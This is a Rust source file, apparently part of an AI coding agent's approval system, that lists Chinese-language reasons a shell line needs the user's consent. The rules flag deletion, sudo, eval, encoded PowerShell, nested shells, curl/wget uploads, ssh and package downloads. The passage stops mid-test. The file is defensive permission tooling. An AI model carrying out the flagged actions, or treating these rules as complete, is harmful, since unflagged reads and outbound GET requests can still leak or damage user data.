//! What a shell line would change, as reasons for approval: files it modifies or
//! deletes, remote state, installed software, system settings and processes, and
//! code whose content cannot be read before it runs. Everything else (reading,
//! building, running project scripts, unknown tools with ordinary arguments) runs
//! without asking; an empty list means the line may run.

use super::{
    classify,
    safety::{self, Nested},
    shell::{self, Dialect, Simple, Word},
};

const MAX_DEPTH: usize = 6;

/// Why `command` needs approval when run in `dialect`; empty when it does not.
pub fn reasons(command: &str, dialect: Dialect) -> Vec<String> {
    let mut out = Vec::new();
    collect(command, dialect, 0, &mut out);
    out.dedup();
    out
}

fn collect(command: &str, dialect: Dialect, depth: usize, out: &mut Vec<String>) {
    if depth > MAX_DEPTH {
        out.push("命令嵌套过深，无法分析".into());
        return;
    }
    let line = shell::parse(command, dialect);
    for reason in &line.opaque {
        if !matches!(
            *reason,
            "parameter expansion with operators" | "PowerShell hashtable" | "PowerShell input redirection"
        ) {
            out.push(format!("包含无法静态分析的结构（{reason}）"));
        }
    }
    for simple in line.commands() {
        simple_reasons(simple, dialect, depth, out);
    }
}

fn simple_reasons(simple: &Simple, dialect: Dialect, depth: usize, out: &mut Vec<String>) {
    for redirect in &simple.redirects {
        if !redirect.op.starts_with('<')
            && !classify::discards(&redirect.target)
            && !scratch(&redirect.target)
        {
            out.push(format!("写入文件（重定向到 {}）", redirect.target));
        }
    }
    let Some(words) = classify::command_words(&simple.words, dialect) else {
        out.push("包含无法静态分析的结构（case/function/cmd if、for、call）".into());
        return;
    };
    let Some(first) = words.first() else {
        return;
    };
    if first.block {
        return;
    }
    if first.dynamic && !shell::is_assignment(&first.text) {
        dynamic_statement(words, dialect, depth, out);
        return;
    }
    let argv: Vec<String> = words.iter().map(|w| w.text.clone()).collect();
    let rest = shell::strip_runners(&argv);
    let offset = argv.len() - rest.len();
    for runner in &argv[..offset] {
        let name = shell::program_name(runner);
        if matches!(name.as_str(), "sudo" | "doas" | "runas" | "gsudo" | "su" | "pkexec") {
            out.push(format!("提权运行（{name}）"));
        } else if shell::is_assignment(runner) && !classify::harmless_variable(runner, true) {
            out.push(format!("修改影响子进程的环境变量（{}）", variable(runner)));
        }
    }
    if rest.is_empty() {
        for word in &argv {
            if shell::is_assignment(word) && !classify::harmless_variable(word, false) {
                out.push(format!("修改 shell 控制变量（{}）", variable(word)));
            }
        }
        return;
    }
    // `"https://x/$id"` stays one word that is not an option; `$args` or an unquoted
    // expansion may split into or become options.
    let dynamic_args = words[offset + 1..].iter().any(|w| {
        w.dynamic && (!w.quoted || w.text.starts_with('$') || w.text.starts_with('-'))
    });
    argv_reasons(rest, dynamic_args, depth, out);
}

fn variable(word: &str) -> &str {
    word.split_once('=').map_or(word, |(name, _)| name)
}

/// A path in the temp directory or a discard device: writing there changes nothing the
/// user keeps.
fn scratch(target: &str) -> bool {
    let normalized = target.replace('\\', "/").to_ascii_lowercase();
    if classify::discards(target) {
        return true;
    }
    if normalized.contains("..") {
        return false;
    }
    let temp = std::env::temp_dir().to_string_lossy().replace('\\', "/").to_ascii_lowercase();
    let temp = temp.trim_end_matches('/');
    ["/tmp/", "/var/tmp/", "$tmpdir/", "${tmpdir}/", "$temp/", "$tmp/", "$env:temp/", "$env:tmp/", "%temp%/", "%tmp%/"]
        .iter()
        .any(|prefix| normalized.starts_with(prefix))
        || (!temp.is_empty() && normalized.starts_with(&format!("{temp}/")))
}

/// A PowerShell statement starting with a variable: a value, an assignment, or a call.
fn dynamic_statement(words: &[Word], dialect: Dialect, depth: usize, out: &mut Vec<String>) {
    if dialect == Dialect::PowerShell && words[0].text.starts_with('$') {
        if words.get(1).is_some_and(|w| w.text == "=") {
            if let Some(name) = words[0].text.strip_prefix("$env:")
                && !classify::harmless_variable(name, true)
            {
                out.push(format!("修改影响子进程的环境变量（{name}）"));
            }
            // `$x = Remove-Item a`: the right side may be a command.
            if words.get(2).is_some_and(|w| !w.dynamic && !w.quoted) {
                let argv: Vec<String> = words[2..].iter().map(|w| w.text.clone()).collect();
                argv_reasons(&argv, words[3..].iter().any(|w| w.dynamic), depth, out);
            }
            return;
        }
        if classify::powershell_value(words) {
            return;
        }
    }
    out.push("程序名来自变量，无法预知运行什么".into());
}

fn positional<'a>(args: &[&'a str]) -> Vec<&'a str> {
    args.iter().copied().filter(|a| !a.starts_with('-')).collect()
}

fn has_any(args: &[&str], flags: &[&str]) -> bool {
    args.iter().any(|a| flags.iter().any(|f| a.eq_ignore_ascii_case(f)))
}

fn has_prefix(args: &[&str], prefixes: &[&str]) -> bool {
    args.iter().any(|a| prefixes.iter().any(|p| a.starts_with(p)))
}

const DELETE: &[&str] = &[
    "rm", "rmdir", "del", "erase", "rd", "unlink", "shred", "remove-item", "ri",
    "clear-content", "clc", "remove-itemproperty", "rp", "clear-recyclebin",
];

const MODIFY: &[&str] = &[
    "mv", "move", "move-item", "mi", "ren", "rename", "rename-item", "rni", "cp", "copy",
    "xcopy", "robocopy", "copy-item", "cpi", "ln", "mklink", "chmod", "chown", "chgrp",
    "truncate", "install", "patch", "set-content", "add-content", "ac", "out-file",
    "tee-object", "export-csv", "export-clixml", "new-itemproperty", "set-itemproperty", "sp",
    "set-item", "si", "split", "csplit", "setfacl", "expand-archive", "compress-archive",
    "start-bitstransfer",
];

const KILL: &[&str] = &["kill", "pkill", "killall", "taskkill", "stop-process", "spps", "tskill"];

const POWER: &[&str] = &[
    "shutdown", "reboot", "halt", "poweroff", "restart-computer", "stop-computer",
];

const LAUNCH: &[&str] = &[
    "start", "open", "xdg-open", "invoke-item", "ii", "start-process", "saps", "explorer",
];

const SYSTEM: &[&str] = &[
    "setx", "mount", "umount", "useradd", "userdel", "usermod", "passwd", "groupadd",
    "chsh", "csrutil", "set-executionpolicy", "stop-service", "start-service",
    "restart-service", "set-service", "new-service", "remove-service", "register-scheduledtask",
    "unregister-scheduledtask", "install-module", "uninstall-module", "update-module",
    "install-package", "uninstall-package", "add-appxpackage", "remove-appxpackage",
    "enable-windowsoptionalfeature", "disable-windowsoptionalfeature", "set-alias", "new-alias",
];

const CODE: &[&str] = &[
    "eval", "iex", "invoke-expression", "invoke-command", "icm", "start-job", "add-type",
];

const PACKAGE_MANAGERS: &[&str] = &[
    "npm", "pnpm", "yarn", "bun", "pip", "pip3", "pipx", "uv", "poetry", "conda", "mamba", "gem",
    "bundle", "composer", "cargo", "go", "dotnet", "nuget", "apt", "apt-get", "yum", "dnf",
    "brew", "choco", "winget", "scoop", "pacman", "zypper", "snap", "flatpak", "rustup", "deno",
    "helm",
];

const INSTALL_VERBS: &[&str] = &[
    "install", "i", "add", "remove", "rm", "uninstall", "un", "purge", "autoremove", "update",
    "upgrade", "up", "ci", "link", "unlink", "prune", "dedupe", "reinstall", "downgrade",
    "sync", "lock", "tidy", "get", "download", "create", "default", "self", "edit", "restore",
];

const REMOTE_VERBS: &[&str] = &[
    "publish", "unpublish", "push", "yank", "login", "logout", "owner", "deprecate", "dist-tag",
    "adduser", "token",
];

/// Flags or a positional verb `name` uses to rewrite sources in place.
fn rewrites_sources(name: &str, args: &[&str]) -> bool {
    let pos = positional(args);
    let sub = pos.first().copied().unwrap_or_default();
    if has_any(args, &["--version", "-V", "--help", "-h"]) {
        return false;
    }
    let checking = has_any(args, &["--check", "-check", "--diff", "--verify-no-changes", "--dry-run"]);
    match name {
        "cargo" => {
            (sub == "fmt" && !checking)
                || sub == "fix"
                || (sub == "clippy" && has_prefix(args, &["--fix"]))
        }
        "go" => matches!(sub, "fmt" | "fix"),
        "gofmt" | "goimports" | "shfmt" => has_any(args, &["-w"]),
        "rustfmt" => !checking && !has_prefix(args, &["--emit"]),
        "prettier" => has_any(args, &["--write", "-w"]),
        "eslint" | "stylelint" => has_prefix(args, &["--fix"]),
        "ruff" => (sub == "format" && !checking) || has_prefix(args, &["--fix"]),
        "black" | "isort" | "yapf" => !checking && !has_any(args, &["-c"]),
        "autopep8" => has_any(args, &["-i", "--in-place"]),
        "dotnet" => sub == "format" && !checking,
        "clang-format" => has_any(args, &["-i"]),
        "terraform" | "tofu" => sub == "fmt" && !checking,
        "biome" => has_prefix(args, &["--write", "--apply", "--fix"]),
        "npm" | "pnpm" | "yarn" => sub == "audit" && pos.get(1) == Some(&"fix"),
        "ktlint" => has_any(args, &["-F", "--format"]),
        _ => false,
    }
}

fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Vec<String>) {
    let Some(exe) = words.first() else {
        return;
    };
    let name = shell::program_name(exe);
    let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
    let pos = positional(&args);
    let n = name.as_str();
    if dynamic_args && matches!(n, "sort" | "uniq" | "find" | "sed" | "tree" | "curl" | "wget" | "rg" | "awk" | "tar" | "xargs") {
        out.push(format!("参数含变量，无法确认不会写文件（{n}）"));
    }
    if DELETE.contains(&n) {
        out.push(format!("删除文件（{n}）"));
        return;
    }
    if MODIFY.contains(&n) {
        // Copying into the temp directory only adds a scratch file.
        let into_scratch = matches!(n, "cp" | "copy" | "copy-item" | "cpi")
            && !dynamic_args
            && pos.last().is_some_and(|dest| scratch(dest));
        if !into_scratch {
            out.push(format!("修改文件（{n}）"));
        }
        return;
    }
    if KILL.contains(&n) {
        out.push(format!("结束进程（{n}）"));
        return;
    }
    if POWER.contains(&n) {
        out.push(format!("关机或重启（{n}）"));
        return;
    }
    if LAUNCH.contains(&n) {
        out.push(format!("启动外部程序或打开文件（{n}）"));
        return;
    }
    if SYSTEM.contains(&n) {
        out.push(format!("修改系统设置或服务（{n}）"));
        return;
    }
    if CODE.contains(&n) {
        out.push(format!("执行动态代码（{n}）"));
        return;
    }
    if rewrites_sources(n, &args) {
        out.push(format!("原地改写源码（{n}）"));
        return;
    }
    match n {
        "tee" if !pos.is_empty() => out.push("写入文件（tee）".into()),
        "export" | "declare" | "typeset" | "readonly" | "local" => {
            let exported = n == "export" || has_prefix(&args, &["-x", "-gx"]);
            for arg in args.iter().filter(|a| !a.starts_with('-')) {
                if shell::is_assignment(arg) && !classify::harmless_variable(arg, exported) {
                    out.push(if exported {
                        format!("修改影响子进程的环境变量（{}）", variable(arg))
                    } else {
                        format!("修改 shell 控制变量（{}）", variable(arg))
                    });
                }
            }
        }
        "cargo" | "dotnet" | "go" | "mvn" | "gradle" | "make" | "npm" | "pnpm" | "yarn"
            if pos.first() == Some(&"clean") =>
        {
            out.push(format!("删除构建产物（{n} clean）"));
            return;
        }
        "dd" if has_prefix(&args, &["of="]) => out.push("写入文件（dd）".into()),
        "attrib" if has_prefix(&args, &["+", "-"]) => out.push("修改文件属性（attrib）".into()),
        "icacls" | "cacls" | "takeown"
            if n == "takeown" || has_any(&args, &["/grant", "/deny", "/remove", "/reset", "/setowner", "/restore"]) =>
        {
            out.push(format!("修改文件权限（{n}）"));
        }
        "sc" => {
            if !pos.first().is_some_and(|s| s.to_ascii_lowercase().starts_with("query") || s.eq_ignore_ascii_case("qc")) {
                out.push("修改服务或文件（sc）".into());
            }
        }
        "net" if !pos.first().is_some_and(|s| s.eq_ignore_ascii_case("view")) => {
            out.push("修改网络、服务或账户设置（net）".into());
        }
        "reg" if !pos.first().is_some_and(|s| s.eq_ignore_ascii_case("query")) => {
            out.push("修改注册表（reg）".into());
        }
        "systemctl" | "service" | "launchctl" => {
            let read = pos.iter().all(|s| {
                matches!(*s, "status" | "show" | "cat" | "is-active" | "is-enabled" | "is-failed" | "list" | "print")
                    || s.starts_with("list-")
                    || !matches!(*s, "start" | "stop" | "restart" | "reload" | "enable" | "disable" | "mask" | "unmask" | "kill" | "load" | "unload" | "bootstrap" | "bootout" | "remove" | "daemon-reload")
            });
            if !read {
                out.push(format!("修改系统服务（{n}）"));
            }
        }
        "crontab" if !has_any(&args, &["-l"]) => out.push("修改定时任务（crontab）".into()),
        "schtasks" if has_any(&args, &["/create", "/delete", "/change", "/run", "/end"]) => {
            out.push("修改计划任务（schtasks）".into());
        }
        "netsh" | "iptables" | "ufw" | "firewall-cmd"
            if !has_any(&args, &["show", "-L", "--list", "status", "--list-all"]) =>
        {
            out.push(format!("修改防火墙或网络设置（{n}）"));
        }
        "defaults" if pos.first().is_some_and(|s| matches!(*s, "write" | "delete")) => {
            out.push("修改系统偏好（defaults）".into());
        }
        "sed" => {
            if has_any(&args, &["-i", "--in-place"]) || has_prefix(&args, &["-i", "--in-place="]) {
                out.push("原地修改文件（sed -i）".into());
            } else if !classify::sed_prints_only(&args) {
                out.push("sed 脚本可能写文件或执行命令".into());
            }
        }
        "awk" | "gawk" | "nawk" | "mawk" => {
            let program = pos.first().copied().unwrap_or_default();
            if has_any(&args, &["-f", "-i"])
                || ["system(", "| \"", "|\"", "> \"", ">\"", ">>", "print >", "printf >"]
                    .iter()
                    .any(|sign| program.contains(sign))
            {
                out.push("awk 程序可能写文件或执行命令".into());
            }
        }
        "sort" if has_prefix(&args, &["-o", "--output", "--compress-program"]) || has_any(&args, &["/o"]) => {
            out.push("写入文件（sort -o）".into());
        }
        "uniq" if pos.len() > 1 => out.push("写入文件（uniq 输出文件）".into()),
        "tree" if has_prefix(&args, &["--output", "-o"]) => out.push("写入文件（tree -o）".into()),
        "rg" if has_prefix(&args, &["--pre"]) => out.push("rg --pre 会执行外部程序".into()),
        "find" => {
            if has_any(&args, &["-delete"]) {
                out.push("删除文件（find -delete）".into());
            }
            if has_prefix(&args, &["-fprint", "-fls"]) {
                out.push("写入文件（find -fprint）".into());
            }
            let mut index = 0;
            while index < args.len() {
                if matches!(args[index], "-exec" | "-execdir" | "-ok" | "-okdir") {
                    let end = args[index + 1..]
                        .iter()
                        .position(|a| matches!(*a, ";" | "\\;" | "+"))
                        .map_or(args.len(), |at| index + 1 + at);
                    let inner: Vec<String> = args[index + 1..end].iter().map(|a| (*a).to_owned()).collect();
                    argv_reasons(&inner, true, depth + 1, out);
                    index = end;
                }
                index += 1;
            }
        }
        "xargs" => {
            let inner = safety::xargs_command(&words[1..]);
            argv_reasons(&inner, true, depth + 1, out);
        }
        "tar" => {
            let first = args.first().copied().unwrap_or_default();
            let cluster = if first.starts_with("--") { "" } else { first.trim_start_matches('-') };
            if cluster.contains(['x', 'c', 'r', 'u']) || has_any(&args, &["--extract", "--create", "--append", "--delete", "--get"]) {
                out.push("解压或打包写文件（tar）".into());
            }
        }
        "unzip" if !has_any(&args, &["-l", "-t", "-v", "-Z", "-p"]) => out.push("解压写文件（unzip）".into()),
        "zip" => out.push("打包写文件（zip）".into()),
        "7z" | "7za" | "7zr" if pos.first().is_some_and(|s| !matches!(*s, "l" | "t" | "i" | "h")) => {
            out.push(format!("解压或打包写文件（{n}）"));
        }
        "gzip" | "gunzip" | "bzip2" | "bunzip2" | "xz" | "unxz" | "zstd" | "unzstd"
            if !has_any(&args, &["-c", "--stdout", "-l", "--list", "-t", "--test"]) =>
        {
            out.push(format!("原地压缩或解压文件（{n}）"));
        }
        "curl" => curl_reasons(&args, out),
        "wget" => {
            let to_stdout = has_any(&args, &["-O-", "-qO-", "--spider"])
                || args.windows(2).any(|w| matches!(w[0], "-O" | "-qO") && w[1] == "-")
                || has_prefix(&args, &["--output-document=-"]);
            if has_prefix(&args, &["--post-data", "--post-file", "--method", "--body-data"]) {
                out.push("向远端发送修改请求（wget POST）".into());
            } else if !to_stdout {
                out.push("下载文件到本地（wget）".into());
            }
        }
        "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm" | "wget.exe" | "curl.exe" => {
            if has_any(&args, &["-outfile"]) {
                out.push(format!("下载文件到本地（{n}）"));
            }
            let method = args
                .windows(2)
                .find(|w| w[0].eq_ignore_ascii_case("-method"))
                .map(|w| w[1].to_ascii_lowercase());
            if method.as_deref().is_some_and(|m| !matches!(m, "get" | "head" | "options"))
                || has_any(&args, &["-body", "-infile", "-form"])
            {
                out.push(format!("向远端发送修改请求（{n}）"));
            }
        }
        "git" => git_reasons(&args, out),
        "gh" => gh_reasons(&args, out),
        "docker" | "podman" | "nerdctl" => {
            let mut sub = pos.first().copied().unwrap_or_default();
            if matches!(sub, "container" | "image" | "volume" | "network" | "system" | "compose" | "builder") {
                sub = pos.get(1).copied().unwrap_or_default();
            }
            if matches!(
                sub,
                "push" | "login" | "logout" | "rm" | "rmi" | "kill" | "stop" | "restart" | "pause"
                    | "unpause" | "run" | "exec" | "start" | "create" | "cp" | "commit" | "prune"
                    | "up" | "down" | "update" | "rename" | "attach"
            ) {
                out.push(format!("修改容器或镜像（{n} {sub}）"));
            }
        }
        "kubectl" | "oc" => {
            if pos.first().is_some_and(|s| {
                matches!(
                    *s,
                    "apply" | "create" | "delete" | "patch" | "replace" | "scale" | "rollout" | "edit"
                        | "set" | "label" | "annotate" | "exec" | "cp" | "drain" | "cordon"
                        | "uncordon" | "taint" | "run" | "expose" | "autoscale" | "attach" | "debug"
                )
            }) {
                out.push(format!("修改集群资源（{n} {}）", pos[0]));
            }
        }
        "terraform" | "tofu" | "pulumi" => {
            if pos.first().is_some_and(|s| {
                matches!(*s, "apply" | "destroy" | "import" | "taint" | "untaint" | "up" | "state" | "refresh" | "workspace")
            }) {
                out.push(format!("修改基础设施（{n} {}）", pos[0]));
            }
        }
        "aws" => {
            let op = pos.get(1).copied().unwrap_or_default();
            let read = op.starts_with("describe-")
                || op.starts_with("list-")
                || (op.starts_with("get-") && op != "get-object")
                || matches!(op, "ls" | "help" | "wait")
                || pos.is_empty();
            if !read {
                out.push(format!("修改云资源（aws {}）", pos.join(" ")));
            }
        }
        "az" | "gcloud" => {
            if pos.iter().any(|s| {
                matches!(*s, "create" | "delete" | "update" | "set" | "add" | "remove" | "deploy" | "start" | "stop" | "restart" | "import" | "apply" | "upload")
            }) {
                out.push(format!("修改云资源（{n}）"));
            }
        }
        "ssh" | "plink" => out.push(format!("在远程主机执行命令（{n}）")),
        "scp" | "sftp" | "rsync" | "ftp" => out.push(format!("复制文件（{n}）")),
        "twine" if pos.first() == Some(&"upload") => out.push("发布到远端（twine upload）".into()),
        "npx" | "bunx" | "uvx" | "pnpx" if has_any(&args, &["-y", "--yes", "-p", "--package"]) || matches!(n, "uvx" | "bunx") => {
            out.push(format!("下载并运行外部包（{n}）"));
        }
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" | "cmd" | "pwsh" | "powershell" => {
            nested_shell(words, n, &args, depth, out);
        }
        "python" | "python3" | "py" | "pythonw" => python_reasons(&args, out),
        "node" | "deno" | "bun" | "perl" | "ruby" | "php" | "rscript" | "lua" | "osascript" => {
            interpreter_reasons(n, &args, &pos, out);
        }
        "source" | "." if pos.first().is_some_and(|p| p.contains('$')) => {
            out.push("执行未知文件（source）".into());
        }
        _ => {}
    }
    if PACKAGE_MANAGERS.contains(&n) {
        package_reasons(n, &args, &pos, out);
    }
}

fn curl_reasons(args: &[&str], out: &mut Vec<String>) {
    let mut index = 0;
    let mut remote = false;
    let mut post = false;
    let mut writes = false;
    let mut get = false;
    while index < args.len() {
        let arg = args[index];
        let (flag, inline) = match arg.split_once('=') {
            Some((flag, value)) if flag.starts_with("--") => (flag, Some(value)),
            _ => (arg, None),
        };
        let value = inline.or_else(|| args.get(index + 1).copied());
        match flag {
            "-o" | "--output" | "-O" | "--remote-name" | "--remote-name-all" | "-D" | "--dump-header"
            | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii" | "--output-dir" => {
                let named = matches!(flag, "-o" | "--output" | "-D" | "--dump-header" | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii");
                if !(named && value.is_some_and(|v| v == "-" || scratch(v))) {
                    writes = true;
                }
            }
            "-X" | "--request" => {
                match value.map(str::to_ascii_uppercase).as_deref() {
                    Some("GET" | "HEAD" | "OPTIONS") | None => {}
                    Some("POST") => post = true,
                    Some(_) => remote = true,
                }
            }
            "-G" | "--get" => get = true,
            "-T" | "--upload-file" => remote = true,
            f if f.starts_with("-d") || f.starts_with("--data") || f.starts_with("--json")
                || f == "-F" || f.starts_with("--form") => post = true,
            _ => {}
        }
        index += 1;
    }
    // A POST to this machine (a local model or dev server) is a query, not a remote change.
    let local = args.iter().any(|a| loopback(a)) && !args.iter().any(|a| a.contains("://") && !loopback(a));
    if remote || (post && !get && !local) {
        out.push("向远端发送修改请求（curl）".into());
    }
    if writes {
        out.push("下载文件到本地（curl -o）".into());
    }
}

fn loopback(arg: &str) -> bool {
    let host = arg.split_once("://").map_or(arg, |(_, rest)| rest);
    ["127.0.0.1", "localhost", "[::1]", "0.0.0.0"]
        .iter()
        .any(|local| host.starts_with(local) && host[local.len()..].chars().next().is_none_or(|c| matches!(c, ':' | '/')))
}

fn git_reasons(args: &[&str], out: &mut Vec<String>) {
    if classify::classify_git(args) == classify::Category::Safe {
        return;
    }
    let Some((sub, rest)) = classify::git_subcommand(args) else {
        out.push("git 参数无法分析".into());
        return;
    };
    let flagged = |flags: &[&str]| rest.iter().any(|a| flags.contains(a) || a.starts_with("--force"));
    let first = rest.first().copied().unwrap_or_default();
    match sub {
        "push" => out.push("推送到远端（git push）".into()),
        "tag" if flagged(&["-f", "-d", "--delete"]) => out.push("删除或覆盖标签（git tag）".into()),
        "branch" if flagged(&["-f", "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C"]) => {
            out.push("删除、重命名或覆盖分支（git branch）".into());
        }
        "config" => out.push("修改 git 配置（git config）".into()),
        "archive" | "format-patch" | "bundle" if flagged(&["-o"]) || rest.iter().any(|a| a.starts_with("--output")) => {
            out.push(format!("写入文件（git {sub}）"));
        }
        "bundle" if first == "create" => out.push("写入文件（git bundle）".into()),
        "reset" if flagged(&["--hard", "--soft", "--mixed", "--merge", "--keep"])
            || (rest.iter().any(|a| !a.starts_with('-')) && !rest.contains(&"--")) =>
        {
            out.push("移动分支指针或丢弃改动（git reset）".into());
        }
        "checkout" | "switch" | "restore" | "clean" | "rm" | "mv" | "rebase" | "merge" | "pull"
        | "cherry-pick" | "revert" | "am" | "apply" | "filter-branch" | "filter-repo" | "update-ref"
        | "replace" | "gc" | "prune" | "repack" | "symbolic-ref" | "update-index" | "read-tree" => {
            out.push(format!("修改工作区或仓库历史（git {sub}）"));
        }
        "stash" if !matches!(first, "list" | "show") => out.push("修改工作区（git stash）".into()),
        "remote" if matches!(first, "add" | "remove" | "rm" | "rename" | "set-url" | "set-head" | "set-branches" | "prune") => {
            out.push("修改远端配置（git remote）".into());
        }
        "worktree" if matches!(first, "remove" | "prune" | "move") => out.push("删除或移动工作树（git worktree）".into()),
        "submodule" if matches!(first, "update" | "deinit" | "sync" | "set-url") => {
            out.push("修改子模块（git submodule）".into());
        }
        "reflog" if matches!(first, "expire" | "delete") => out.push("删除 reflog（git reflog）".into()),
        "notes" if matches!(first, "remove" | "prune" | "edit" | "add" | "append" | "copy") => {
            out.push("修改 git notes".into());
        }
        // ls-remote, archive to stdout, add, commit, fetch, clone, init, tag/branch
        // creation and other subcommands only add or read.
        _ => {}
    }
}

fn gh_reasons(args: &[&str], out: &mut Vec<String>) {
    let pos = positional(args);
    if pos.first() == Some(&"api") {
        let method = args
            .windows(2)
            .find(|w| matches!(w[0], "-X" | "--method"))
            .map(|w| w[1].to_ascii_uppercase());
        let fields = has_prefix(args, &["-f", "-F", "--field", "--raw-field", "--input"]);
        if method.as_deref().is_some_and(|m| m != "GET") || (fields && method.is_none()) {
            out.push("向 GitHub 发送修改请求（gh api）".into());
        }
        return;
    }
    let verb = pos.get(1).copied().unwrap_or_default();
    if matches!(
        verb,
        "create" | "edit" | "delete" | "merge" | "close" | "reopen" | "comment" | "review" | "ready"
            | "upload" | "fork" | "rename" | "archive" | "unarchive" | "sync" | "enable" | "disable"
            | "run" | "rerun" | "cancel" | "set" | "remove" | "add" | "login" | "logout" | "refresh"
            | "install" | "upgrade" | "lock" | "unlock" | "transfer" | "pin" | "unpin" | "checkout"
            | "develop"
    ) || (pos.first() == Some(&"workflow") && verb == "run")
    {
        out.push(format!("修改 GitHub 上的内容（gh {} {verb}）", pos[0]));
    }
}

fn package_reasons(name: &str, args: &[&str], pos: &[&str], out: &mut Vec<String>) {
    let lead = &pos[..pos.len().min(2)];
    if let Some(verb) = lead.iter().find(|v| REMOTE_VERBS.contains(v)) {
        out.push(format!("发布或修改远端（{name} {verb}）"));
        return;
    }
    // `npm run x`, `yarn build`: project scripts run without asking.
    if matches!(name, "npm" | "pnpm" | "yarn" | "bun") && lead.first().is_some_and(|v| matches!(*v, "run" | "run-script" | "test" | "t" | "start" | "exec" | "x")) {
        if matches!(lead.first(), Some(&("exec" | "x"))) && has_any(args, &["-y", "--yes"]) {
            out.push(format!("下载并运行外部包（{name} {}）", lead[0]));
        }
        return;
    }
    if matches!(name, "pnpm" | "yarn") && lead.first() == Some(&"dlx") {
        out.push(format!("下载并运行外部包（{name} dlx）"));
        return;
    }
    if name == "yarn" && pos.is_empty() && !has_any(args, &["--version", "-v", "--help", "-h"]) {
        out.push("安装依赖（yarn）".into());
        return;
    }
    // Build tools whose first word is a build step, not a package verb.
    if matches!(name, "cargo" | "go" | "dotnet") && lead.first().is_some_and(|v| matches!(*v, "build" | "test" | "run" | "check" | "bench" | "doc" | "vet" | "clippy")) {
        return;
    }
    if name == "dotnet" && lead.first() == Some(&"restore") {
        return;
    }
    if let Some(verb) = lead.iter().find(|v| INSTALL_VERBS.contains(v)) {
        out.push(format!("安装、卸载或更新依赖（{name} {verb}）"));
    }
}

fn nested_shell(words: &[String], name: &str, args: &[&str], depth: usize, out: &mut Vec<String>) {
    let inner_dialect = match name {
        "cmd" => Dialect::Cmd,
        "pwsh" | "powershell" => Dialect::PowerShell,
        _ => Dialect::Posix,
    };
    match safety::unwrap_shell(words) {
        Some(Nested::Encoded) => out.push(format!("执行编码过的命令（{name} -EncodedCommand）")),
        Some(Nested::Text(text)) => {
            if text.contains("$(...)") || text.trim().is_empty() {
                out.push(format!("执行无法预知的命令文本（{name}）"));
            } else {
                collect(&text, inner_dialect, depth + 1, out);
            }
        }
        // A script file is a project script; no arguments reads code from stdin.
        None if positional(args).is_empty() && !has_any(args, &["--version", "-v", "--help", "/?"]) => {
            out.push(format!("从标准输入执行代码（{name}）"));
        }
        None => {}
    }
}

fn python_reasons(args: &[&str], out: &mut Vec<String>) {
    let mut index = 0;
    while let Some(arg) = args.get(index) {
        match *arg {
            "-c" => {
                out.push("执行内联代码（python -c）".into());
                return;
            }
            "-m" => {
                let module = args.get(index + 1).copied().unwrap_or_default();
                if module == "pip" {
                    let rest: Vec<&str> = args[index + 2..].to_vec();
                    package_reasons("pip", &rest, &positional(&rest), out);
                }
                return;
            }
            "-" => {
                out.push("从标准输入执行代码（python）".into());
                return;
            }
            a if a.starts_with('-') => index += 1,
            _ => return,
        }
    }
    if !args.iter().any(|a| matches!(*a, "--version" | "-V" | "--help" | "-h")) {
        out.push("从标准输入执行代码（python）".into());
    }
}

fn interpreter_reasons(name: &str, args: &[&str], pos: &[&str], out: &mut Vec<String>) {
    let inline = match name {
        "node" | "bun" => &["-e", "--eval", "-p", "--print"][..],
        "perl" => &["-e", "-E", "-i", "-pi", "-ni"][..],
        "ruby" => &["-e"][..],
        "php" => &["-r"][..],
        "rscript" | "lua" | "osascript" => &["-e"][..],
        "deno" => &[][..],
        _ => &[][..],
    };
    if has_any(args, inline) || (name == "perl" && has_prefix(args, &["-i"])) {
        out.push(format!("执行内联代码（{name}）"));
        return;
    }
    if name == "deno" {
        if pos.first() == Some(&"eval") {
            out.push("执行内联代码（deno eval）".into());
        } else if pos.iter().any(|p| p.contains("://")) {
            out.push("运行网络上的脚本（deno）".into());
        }
        return;
    }
    if pos.is_empty() && !has_any(args, &["--version", "-v", "-V", "--help", "-h"]) {
        out.push(format!("从标准输入执行代码（{name}）"));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every shell command in the local cove sessions, judged as it would be today:
    /// `cargo test --lib -- risk::tests::real_sessions --ignored --nocapture`.
    #[test]
    #[ignore]
    fn real_sessions() {
        fn walk(value: &serde_json::Value, out: &mut Vec<String>) {
            match value {
                serde_json::Value::Object(map) => {
                    if map.get("name").and_then(|n| n.as_str()) == Some("shell")
                        && let Some(command) = map
                            .get("input")
                            .and_then(|i| i.get("command"))
                            .and_then(|c| c.as_str())
                    {
                        out.push(command.to_owned());
                    }
                    map.values().for_each(|v| walk(v, out));
                }
                serde_json::Value::Array(items) => items.iter().for_each(|v| walk(v, out)),
                _ => {}
            }
        }
        let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).unwrap();
        let mut commands = Vec::new();
        for entry in std::fs::read_dir(std::path::Path::new(&home).join(".cove/sessions")).unwrap().flatten() {
            if let Ok(text) = std::fs::read_to_string(entry.path())
                && let Ok(value) = serde_json::from_str::<serde_json::Value>(&text)
            {
                walk(&value, &mut commands);
            }
        }
        commands.sort();
        commands.dedup();
        let mut counts: std::collections::BTreeMap<String, (usize, String)> = Default::default();
        let mut asked = 0;
        let mut report = String::new();
        for command in &commands {
            let found = reasons(command, Dialect::for_command(command));
            if !found.is_empty() {
                asked += 1;
            }
            for reason in found {
                report.push_str(&format!(
                    "[{reason}] {}\n",
                    command.chars().take(220).collect::<String>().replace('\n', "⏎")
                ));
                let key = reason.split('（').next().unwrap_or(&reason).to_owned();
                let entry = counts.entry(key).or_insert((0, String::new()));
                entry.0 += 1;
                if entry.1.is_empty() {
                    entry.1 = command.chars().take(140).collect();
                }
            }
        }
        println!("distinct commands: {}, would ask: {asked}", commands.len());
        let mut lines: Vec<&str> = report.lines().collect();
        lines.sort();
        std::fs::write("target/risk-report.txt", lines.join("\n")).unwrap();
        let mut rows: Vec<_> = counts.into_iter().collect();
        rows.sort_by_key(|row| std::cmp::Reverse(row.1.0));
        for (reason, (count, sample)) in rows {
            println!("{count:5}  {reason}\n       e.g. {}", sample.replace('\n', "⏎"));
        }
    }

    fn posix(command: &str) -> Vec<String> {
